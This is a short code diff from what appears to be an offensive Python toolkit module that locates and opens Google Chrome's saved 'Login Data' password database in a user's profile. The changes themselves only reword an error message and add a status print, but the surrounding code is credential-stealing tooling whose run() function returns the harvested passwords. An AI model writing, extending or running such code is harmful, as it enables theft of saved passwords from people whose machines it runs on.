@@ -25,7 +25,7 @@ def get_chrome_passwords():
         if path.isdir(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Profile 1"):
             p = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Profile 1\Login Data"
     except:
-        return ["Failed to locate login database"]
+        return "[-] Failed to locate login database"
 
     conn = sqlite3.connect(p)
     sql = conn.cursor()
@@ -39,4 +39,5 @@ def get_chrome_passwords():
 
 
 def run():
+    print "[*] In chrome password module"
     return str(get_chrome_passwords())
